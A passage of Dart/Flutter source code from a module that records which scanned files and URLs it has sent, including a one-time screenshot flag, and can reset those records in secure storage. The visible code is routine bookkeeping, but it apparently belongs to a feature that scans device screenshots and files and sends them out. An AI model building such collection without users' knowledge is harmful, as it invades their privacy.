          value: jsonEncode(_sentUrls),
        );
        return;
      } catch (e) {
        debugPrint('[M] ⚠️ 持久化失败 ($attempt/3): $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(milliseconds: 100));
        }
      }
    }
  }

  Future<void> reset() async {
    _sent.clear();
    _sentUrls.clear();
    _jsonSent = false;
    _jsonUrl = null;
    _screenshotDone = false;
    _lastScannedShotCount = 0;
    _lastSnapshot = <String>{};

    await _deleteSecure(_kSent);
    await _deleteSecure(_kSentUrls);
    await _deleteSecure(_kJsonSent);
    await _deleteSecure(_kJsonUrl);
    await _deleteSecure(_kScreenshotDone);
    await _deleteSecure(_kLastScanSnapshot);
    debugPrint('[M] 记录已清空（含截图一次性标记、扫描快照）');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  /// 是否来自截图目录
  final bool isScreenshot;
  _Scanned(this.file, this.modified, this.size, {this.isScreenshot = false});
}